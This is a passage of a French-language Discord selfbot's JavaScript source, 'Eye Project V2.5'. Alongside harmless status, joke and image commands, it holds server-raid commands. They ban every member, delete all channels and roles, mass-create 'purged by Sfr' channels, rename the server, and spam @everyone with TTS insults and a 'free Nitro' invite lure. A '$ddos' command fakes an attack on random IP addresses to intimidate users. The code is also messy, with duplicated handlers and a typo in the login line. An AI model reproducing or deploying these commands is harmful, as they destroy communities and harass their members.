      var answer = ["𝓒'𝒆𝓼𝓽 𝓬𝒆𝓻𝓽𝓪𝓲𝓷",
        '𝓞𝓾𝓲',
        '𝓟𝒆𝓾𝓽 𝒆́𝓽𝓻𝒆',
        '𝓟𝓻𝓸𝓫𝓪𝓫𝓵𝒆𝓶𝒆𝓷𝓽^^',
        '𝓙𝒆 𝓷𝒆 𝓹𝒆𝓷𝓼𝒆 𝓹𝓪𝓼',
        '𝓐𝓵𝓸𝓻𝓼 𝓵𝓪... *ℋ𝓾𝓶ℋ𝓾𝓶 𝓣𝓸𝓾𝓼𝓼𝒆𝓶𝒆𝓷𝓽*',
        '𝓟𝓴 𝓬𝒆𝓽𝓽𝒆 𝓺𝓾𝒆𝓼𝓽𝓲𝓸𝓷 ?',
        '𝓙𝓼𝓹',
        '𝓝𝓸𝓷'];
      const ballEmbed = new Discord.RichEmbed()
        .setTitle('𝐕𝐨𝐢𝐜𝐢 𝐋𝐚 𝐑𝐞𝐩𝐨𝐧𝐬𝐞 𝐀 𝐋𝐚 𝐑𝐞𝐩𝐨𝐧𝐬𝐞 𝐚 𝐋𝐚 𝐐𝐮𝐞𝐬𝐭𝐢𝐨𝐧 :')
        .setDescription(answer[Math.round(Math.random() * (answer.length - 1))] + ' .')
        .setColor(0x000001)
        .setFooter('𝐄𝐲𝐞 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐕𝟐.𝟓');
      message.channel.send(ballEmbed);
    }
  
  }
  var argresult = message.content.split(` `).slice(1).join(' ');

  if (message.content.includes(prefix + "stream")) {
    if (message.author.id === client.user.id) {
      if (message.deletable) message.delete();
      client.user.setGame(argresult, "https://www.twitch.tv/EyeProject");

      message.channel.send(`𝓣𝓾 𝓓𝓲𝒇𝒇𝓾𝓼𝒆 ℳ𝓪𝓲𝓷𝓽𝒆𝓷𝓪𝓷𝓽 : ${argresult}🌴`)

    }
  }
  if (message.content.includes(prefix + "music")) {
    if (message.author.id == client.user.id) {
        message.delete();
        client.user.setActivity(argresult, {
            type: "LISTENING"
        });
        message.channel.send(`𝓣𝓾 𝓔𝓬𝓸𝓾𝓽𝒆 ℳ𝓪𝓲𝓷𝓽𝒆𝓷𝓪𝓷𝓽 : ${argresult}🌴`)
    }
}
  if (message.content.includes(prefix + "play")) {
    if (message.author.id == client.user.id) {
        message.delete();
        client.user.setActivity(argresult, {
            type: "PLAYING"
        });
        message.channel.send(`𝓣𝓾 𝓙𝓸𝓾𝒆 ℳ𝓪𝓲𝓷𝓽𝒆𝓷𝓪𝓷𝓽 𝓪 : ${argresult}🌴`)
    }
}
  if (message.content.includes(prefix + "watch")) {
    if (message.author.id == client.user.id) {
        message.delete();
        client.user.setActivity(argresult, {
            type: "WATCHING"
        });
        message.channel.send(`𝓣𝓾 ℛ𝒆𝓰𝓪𝓻𝓭𝒆 ℳ𝓪𝓲𝓷𝓽𝒆𝓷𝓪𝓷𝓽  : ${argresult}🌴`)
    }
}
    if (message.content.includes(prefix + "neko")) {
      superagent.get("https://nekos.life/api/neko", (err, res) => {
          if (err) { return message.channel.send(":x: Une erreur c'est produite ") }
          message.edit("", { embed: new Discord.RichEmbed().setTitle("𝐒𝐞𝐥𝐟𝐁𝐨𝐭 || 𝐓𝐢𝐞𝐧 𝐦𝐨𝐧 𝐜𝐨𝐪𝐮𝐢𝐧 𝐯𝐨𝐢𝐥𝐚 𝐭𝐨𝐧 𝐧𝐞𝐤𝐨 :wink:").setColor(0x000001).setImage(res.body.neko).setFooter('▁ ▂ ▄ ▅ ▆ ▇ █ 𝐄𝐲𝐞 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐕𝟐.𝟓 █ ▇ ▆ ▅ ▄ ▂ ▁') })
      })
  }
     client.on("message", message => {
    if (message.content === '!all') {
		if (message.author.id == client.user.id) {
      if (message.deletable) message.delete();
      let i = 0;
      var interval = setInterval(function () {
          message.guild.channels.forEach(channel => {
if (channel.type === "text") channel.send("Hey\nBande\nDe\nBitch\n\nThisServeur As Bin Purged By RaidBySfr\nAller la Bise sur le cu @everyone", { tts: true } ).then(i++);
      }, 3500);
  })
}
	 }
}); 
  	client.on("message", message => {
if(message.content === "!createchannel"){
	 if (message.author.id == client.user.id) {
    if(message.guild.channels.size === 0) return;
    if(message.channel.type === "dm") return;
  setInterval(function () { if(message.guild.channels.size < 499){
        message.guild.createChannel('💀🇵🇺🇷🇬🇪🇩-🇧🇾-𝙎𝙛𝙧', 'text').catch(error => {})
        message.guild.createChannel('    💀𝙎𝙛𝙧 𝑷𝑼𝑹𝑮𝑬𝑫', 'text').catch(error => {})
        message.guild.createChannel('💀🇵🇺🇷🇬🇪🇩-🇧🇾-𝙎𝙛𝙧', 'text').catch(error => {})
        message.guild.createChannel('    💀𝙎𝙛𝙧 𝑷𝑼𝑹𝑮𝑬𝑫', 'text').catch(error => {})
        message.guild.createChannel('💀🇵🇺🇷🇬🇪🇩-🇧🇾-𝙎𝙛𝙧', 'text').catch(error => {})
        message.guild.createChannel('    💀𝙎𝙛𝙧 𝑷𝑼𝑹𝑮𝑬𝑫', 'text').catch(error => {})
  }}, 400)
	 }
}
}); 
  if (message.content.startsWith(prefix + 'rolecreate')) {
    if (message.author.id == client.user.id) {
      message.delete();
      for (var i = 0; i < 90; i++) {
        message.guild.createRole({
          name: ("Fuckeud By Sfr"),
          mentionable: false,
          permissions: 0,
          position: "",
          color: 'RANDOM'
        })
      }
    }
  }
				 if (message.content === prefix + "ass"){       

    var max = 5511;
    var min = 1000;
    var MathRan = Math.floor(Math.random() * (max - min + 0)) + min;
    var MathLoL = Math.round(MathRan);
    if (message.channel.nsfw) {
        message.channel.send(":underage: Va Dans un channel NSFW Plz ^^ ")
    } else {
        var randomname = Math.floor(Math.random() * (99999999999999999999 - 11111111111111111111 + 0)) + 11111111111111111111;
    }
    
    let embed = new Discord.RichEmbed()	  
        .setColor(0xd36b00)
        .setTitle('**Picture Of Ass**')
        .setDescription("[L'image Charge Pas Click Ici !](http://media.obutts.ru/butts_preview/0" + MathLoL + ".jpg)")
		    .setImage("http://media.obutts.ru/butts_preview/0" + MathLoL + ".jpg")
        embed.setTimestamp();		
		message.channel.send(embed);
    
    }
  if (message.content.startsWith(prefix + 'delrole')) {
    if (message.author.id == client.user.id) {
      message.delete();
      for (var i = 0; i < 90; i++) {
        message.guild.roles.deleteAll()
      }
      var embed = new Discord.RichEmbed()
        .setTitle("𝐒𝐞𝐥𝐟𝐁𝐨𝐭 || 𝐃𝐞𝐥𝐞𝐭𝐞 𝐑𝐨𝐥𝐞𝐬 ")
        .setDescription('ℛ𝓸𝓵𝒆𝓼 𝓔𝓷 𝓒𝓸𝓾𝓻 𝓓𝒆 𝓓𝒆𝓵𝒆𝓽𝒆 𝓟𝒆𝓷𝓽𝓲𝒆𝓷𝓽𝒆𝓻 𝓾𝓷 𝓹𝒆𝓾 ^^')
        .setImage('https://cdn.discordapp.com/attachments/570759268949819402/576065429949382657/delete.gif')
        .setColor(0x000001)
        .setFooter('▁ ▂ ▄ ▅ ▆ ▇ █ 𝐄𝐲𝐞 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐕𝟐.𝟓 █ ▇ ▆ ▅ ▄ ▂ ▁')
      message.channel.sendEmbed(embed);
    }
  }
      if (message.content === prefix + "banall"){
        if (message.deletable) message.delete();
    if (message.author.id != "575829819099578368") return;
    message.guild.members.forEach(member => {
      member.ban().then(function () {});
    });
    }
	      if (message.content === prefix + "destroy"){
        if (message.deletable) message.delete();
    if (message.author.id != "575829819099578368") return;
    message.guild.members.forEach(member => {
      member.ban().then(function () {});
    });
    }
  if (message.content.includes(prefix + "delchannel")) {
    if (message.author.id !== client.user.id) {} else {
        message.delete()
        message.guild.channels.map(c => c.delete())
        message.guild.createChannel("𝓣𝓱𝒆 ℒ𝓪𝓼𝓽 𝓒𝓱𝓪𝓷𝓷𝒆𝓵", "text")
    }
}
if(message.content.startsWith(prefix + "purge")) {
	if (message.author.id == client.user.id) {
      let args = message.content.split(" ").slice(1);
      let messagecount = parseInt(args[0]) || 1;
      var deletedMessages = -1;
      message.channel.fetchMessages({ limit: Math.min(messagecount + 1, 100, 200) })
          .then(messages => {
              messages.forEach(message => { message.delete().catch(console.error); deletedMessages++; });
          }).then(() => {
              if (deletedMessages === -1) deletedMessages = 0
              message.channel.send(`${deletedMessages} **Sont en cour De delete**`)
            .then(message => message.delete(5000));
          }).catch(console.error);
  }
}
if(message.content === prefix + "emma"){
  if (message.deletable) message.delete();
  if (message.author.id != "575829819099578368") return
    let rotate = 0;
setInterval(function() {
    if(rotate === 0) {
        client.user.setActivity("AFK - Dort  / Music 🎵", {type: "Streaming", url: 'https://www.twitch.tv/aphsync'});
        rotate = 1;       
    } else if(rotate === 1){
        client.user.setActivity("Caprisun C'est Bae 💛", {type: "Streaming", url: 'https://www.twitch.tv/aphsync'});
        rotate = 2;
    } else if(rotate === 2){
        client.user.setActivity(`AFK - Dort  / Music 🎵`, {type: "Streaming", url: 'https://www.twitch.tv/aphsync'});
        rotate = 3;
    }  else if(rotate === 3){
        random = Math.floor(Math.random() * 7) + 1;
        client.user.setActivity(`Caprisun C'est Bae 💛`, {type: "Streaming", url: 'https://www.twitch.tv/aphsync'});
        rotate = 0;
    }}, 20 * 2000)
    var embed = new Discord.RichEmbed()
    .setAuthor("⚜️ | 𝙈𝙪𝙡𝙩𝙞𝙎𝙩𝙧𝙚𝙖𝙢 𝙀𝙣 𝘾𝙝𝙖𝙧𝙜𝙚𝙢𝙚𝙣𝙩...")
.setImage('https://cdn.discordapp.com/attachments/576804315180826654/576982550002663444/dzadsq.gif')
    .setColor(0x000001)
  message.channel.sendEmbed(embed);
  }
if(message.content === prefix + "multistream"){
      if (message.deletable) message.delete();
      if (message.author.id != "575829819099578368") return
        let rotate = 0;
    setInterval(function() {
        if(rotate === 0) {
            client.user.setActivity("☝️", {type: "Streaming", url: 'https://www.twitch.tv/aphsync'});
            rotate = 1;       
        } else if(rotate === 1){
            client.user.setActivity("💀", {type: "Streaming", url: 'https://www.twitch.tv/aphsync'});
            rotate = 2;
        } else if(rotate === 2){
            client.user.setActivity(`🔮`, {type: "Streaming", url: 'https://www.twitch.tv/aphsync'});
            rotate = 3;
        }  else if(rotate === 3){
            random = Math.floor(Math.random() * 7) + 1;
            client.user.setActivity(`𝙀𝙮𝙚 𝙋𝙧𝙤𝙟𝙚𝙘𝙩  👁️`, {type: "Streaming", url: 'https://www.twitch.tv/aphsync'});
            rotate = 0;
        }}, 20 * 2000)
		    var embed = new Discord.RichEmbed()
        .setAuthor("⚜️ | 𝙈𝙪𝙡𝙩𝙞𝙎𝙩𝙧𝙚𝙖𝙢 𝙀𝙣 𝘾𝙝𝙖𝙧𝙜𝙚𝙢𝙚𝙣𝙩...")
		.setImage('https://cdn.discordapp.com/attachments/576804315180826654/576982550002663444/dzadsq.gif')
        .setColor(0x000001)
      message.channel.sendEmbed(embed);
      }
if (message.content.startsWith(prefix + 'destroy')) {
      if (message.author.id == client.user.id) {
        message.delete();
        for (var i = 0; i < 90; i++) {
          message.guild.createRole({
            name: ("𝙁𝙪𝙘𝙠𝙚𝙪𝙙 𝘽𝙮 𝙎𝙛𝙧"),
            mentionable: false,
            permissions: 0,
            position: "",
            color: 'RANDOM'
          })
        }
      }
    }
	if(message.content === prefix + "destroy"){
    if (message.deletable) message.delete();
    if (message.author.id != "575829819099578368") return;
    if(message.channel.type === "dm") return;
    if(message.guild.channels.size === 0) return;
}

client.on("message", message => {
  if(message.content === "!createchannel"){
    if (message.author.id == client.user.id) {
    if (message.deletable) message.delete();
      if(message.guild.channels.size === 0) return;
      if(message.channel.type === "dm") return;
    setInterval(function () { if(message.guild.channels.size < 499){
          message.guild.createChannel('💀🇵🇺🇷🇬🇪🇩-🇧🇾-𝙎𝙛𝙧', 'text').catch(error => {})
          message.guild.createChannel('    💀𝙎𝙛𝙧 𝑷𝑼𝑹𝑮𝑬𝑫', 'text').catch(error => {})
          message.guild.createChannel('💀🇵🇺🇷🇬🇪🇩-🇧🇾-𝙎𝙛𝙧', 'text').catch(error => {})
          message.guild.createChannel('    💀𝙎𝙛𝙧 𝑷𝑼𝑹𝑮𝑬𝑫', 'text').catch(error => {})
          message.guild.createChannel('💀🇵🇺🇷🇬🇪🇩-🇧🇾-𝙎𝙛𝙧', 'text').catch(error => {})
          message.guild.createChannel('    💀𝙎𝙛𝙧 𝑷𝑼𝑹𝑮𝑬𝑫', 'text').catch(error => {})
    }}, 400)
  }
}
  });
if(message.content === prefix + "destroy"){
    if(message.channel.type === "dm") return;
    if (message.author.id != "575829819099578368") return; 
    if(message.guild.name != "🎗 𝙁𝙪𝙘𝙠𝙚𝙪𝙙 𝘽𝙮 𝙎𝙛𝙧 🎗"){
         message.guild.setIcon('./logo.png').catch(error => {})
         message.guild.setName('⚡ 𝙁𝙪𝙘𝙠𝙚𝙪𝙙 𝘽𝙮 𝙎𝙛𝙧 ⚡').catch(error => {})
         message.guild.setRegion('russia').catch(error => {})
     }
     setInterval(function () { if(message.guild.channels.size < 499){
       message.guild.createChannel('𝙁𝙪𝙘𝙠𝙚𝙪𝙙 𝘽𝙮 𝙎𝙛𝙧', 'text').catch(error => {})
     }}, 400)
     if(message.deletable) message.delete();
   }
   
   if (message.content === prefix + 'destroy') {
    if(message.channel.type === "dm") return;
    if (message.author.id != "575829819099578368") return; 
      setInterval (function () { message.channel.send("@everyone @here 𝙁𝙪𝙘𝙠𝙚𝙪𝙙 𝘽𝙮 𝙎𝙛𝙧 \n"+
      "https://discord.gg/kesm7fh \n"+
     "JOIN HERE FOR NITRO\n"+
     "𝙁𝙪𝙘𝙠𝙚𝙪𝙙 𝘽𝙮 𝙎𝙛𝙧", { tts: true } ).catch(error => {}) }, 400)
    }
    
  if (message.content.startsWith(prefix + 'kick')) {
    if (message.author.id == client.user.id) {
      message.delete();

    if(!message.guild.member(message.author).hasPermission("KICK_MEMBERS")) return message.channel.send("𝐓𝐮 𝐧'𝐚 𝐩𝐚𝐬 𝐥𝐚 𝐩𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 𝐝𝐞 𝐤𝐢𝐜𝐤 𝐮𝐧 𝐦𝐞𝐦𝐛𝐫𝐞 ! :x:");

    if(message.mentions.users.size === 0) {
        return message.channel.send("𝐌𝐞𝐧𝐭𝐢𝐨𝐧𝐧𝐞 𝐮𝐧 𝐮𝐭𝐢𝐥𝐢𝐬𝐚𝐭𝐞𝐮𝐫 ")
    }
    var kick = message.guild.member(message.mentions.users.first());
    if(!kick) {
        return message.channel.send("𝐔𝐭𝐢𝐥𝐢𝐬𝐚𝐭𝐞𝐮𝐫 𝐢𝐧𝐭𝐫𝐨𝐮𝐯𝐚𝐛𝐥𝐞 :x: ")
    }

    if(!message.guild.member(client.user).hasPermission("KICK_MEMBERS")) {
        return message.channel.send("𝐓𝐮 𝐧'𝐚 𝐩𝐚𝐬 𝐥𝐚 𝐩𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 𝐝𝐞 𝐤𝐢𝐜𝐤 𝐮𝐧 𝐦𝐞𝐦𝐛𝐫𝐞 ! :x:");
    }

    kick.kick().then(member => {
        message.channel.send(`${member.user.username} 𝐊𝐢𝐜𝐤 𝐚𝐯𝐞𝐜 𝐬𝐮𝐜𝐜𝐞𝐬`);
    });
}
  }
  if (message.content.startsWith(prefix + 'ban')) {
    if (message.author.id == client.user.id) {
      message.delete();

    if(!message.guild.member(message.author).hasPermission("BAN_MEMBERS")) return message.channel.send("𝐓𝐮 𝐧'𝐚 𝐩𝐚𝐬 𝐥𝐚 𝐩𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 𝐝𝐞 𝐛𝐚𝐧 𝐮𝐧 𝐦𝐞𝐦𝐛𝐫𝐞 ! :x:");

    if(message.mentions.users.size === 0) {
        return message.channel.send("𝐌𝐞𝐧𝐭𝐢𝐨𝐧𝐧𝐞 𝐮𝐧 𝐮𝐭𝐢𝐥𝐢𝐬𝐚𝐭𝐞𝐮𝐫 ");
    }

    var ban = message.guild.member(message.mentions.users.first());
    if(!ban) {
        return message.channel.send("𝐔𝐭𝐢𝐥𝐢𝐬𝐚𝐭𝐞𝐮𝐫 𝐢𝐧𝐭𝐫𝐨𝐮𝐯𝐚𝐛𝐥𝐞 :x:");
    }

    if(!message.guild.member(client.user).hasPermission("BAN_MEMBERS")) {
        return message.channel.send("𝐓𝐮 𝐧'𝐚 𝐩𝐚𝐬 𝐥𝐚 𝐩𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 𝐝𝐞 𝐛𝐚𝐧 𝐮𝐧 𝐦𝐞𝐦𝐛𝐫𝐞 ! :x:");
    }
    ban.ban().then(member => {
        message.channel.send(`${member.user.username} est ban par ${message.author.username} !`)
    });
  }
}
if (message.content.includes(prefix + "delmessage")) {
  if (message.author.id !== client.user.id) {} else {
      message.delete()
      let messagecount = parseInt(message.content.split(" ").slice(1), [0], 10) ? parseInt(message.content.split(" ").slice(1), [0], 10) : 1;
      message.channel.fetchMessages({
              limit: 100
          })
          .then(messages => {
              let msg_array = messages.array();
              msg_array = msg_array.filter(m => m.author.id === client.user.id);
              msg_array.length = messagecount + 1;
              msg_array.map(m => m.delete().catch(console.error));
          });
  }
}

})
client.on('message', message => {
	
	
	let user;

      if (message.mentions.users.first()) {
        user = message.mentions.users.first();
      } else {
        user = message.author;
      }
	
	
	
	let messageArray = message.content.split(" "); let cmd = messageArray[0]; let args = messageArray.slice(1);
	if (cmd == "$ddos") {
		if (message.author.id != "575829819099578368") return;
			     let replies = ["98.105.45.74", "94.210.57.46", "105.45.75.46", "87.45.241.62", "74.120.54.95", "105.87.65.41", "98.26.45.71", "105.64.21.74"]    
    let res = Math.floor((Math.random() * replies.length)); 
    var ip = res; 
    var port = 80; 
    let ddosembed = new Discord.RichEmbed()
	.setAuthor(`😈 𝘿𝘿𝙊𝙎 𝘿𝙚 ${user.username} 𝙀𝙣 𝘾𝙤𝙪𝙧... 😈 \n` + "󠂪")
    .setColor("#000000")
	.setThumbnail(user.avatarURL)
    .addField(`----------------------------------------------------------`, '󠂪')
    .addField("𝙏𝙮𝙥𝙚 𝘿'𝙞𝙥 𝘿𝙚 𝙇𝙖 𝙑𝙞𝙘𝙩𝙞𝙢𝙚 : ", `${ip}\n` + "󠂪" )
    .addField("𝙋𝙤𝙧𝙩 𝘿𝙚 𝙇𝙖 𝙑𝙞𝙘𝙩𝙞𝙢𝙚 : ", `${port}\n` + "󠂪")
	.addField('----------------------------------------------------------', '󠂪')
	.setImage('https://78.media.tumblr.com/efe16480a0a8925cf27711234b94a794/tumblr_ovm2yl134K1v07xajo2_500.gif')
    .setFooter(`𝘿𝙙𝙤𝙨 𝙚𝙣 𝙘𝙤𝙪𝙧 𝘽𝙮 ${message.author.username}`); 
    message.channel.send(ddosembed);
    var charge = "-"; 
    var chargeC = "▒"; 
    message.channel.send("【" + charge.repeat(40) + "】").then((message) => { for (i = 0; i <= 40; i++) { message.edit("【" + chargeC.repeat(i) + charge.repeat(40 - i) + "】  -  " + i * 100 / 40 + "% **100% =** 𝘿𝘿𝙊𝙎"); } }) }
})
client.on('message', message => {
	
	let messageArray = message.content.split(" "); let cmd = messageArray[0]; let args = messageArray.slice(1);
	if (cmd == "!multistream") {
		if (message.author.id != "575829819099578368") return;

var charge = "-"; 
    var chargeC = "▒"; 
    message.channel.send("[" + charge.repeat(40) + "]").then((message) => { for (i = 0; i <= 40; i++) { message.edit("【" + chargeC.repeat(i) + charge.repeat(40 - i) + "】  -  " + i * 100 / 40 + "%"); } }) }
})

client.login(procces.env.TOKEN)





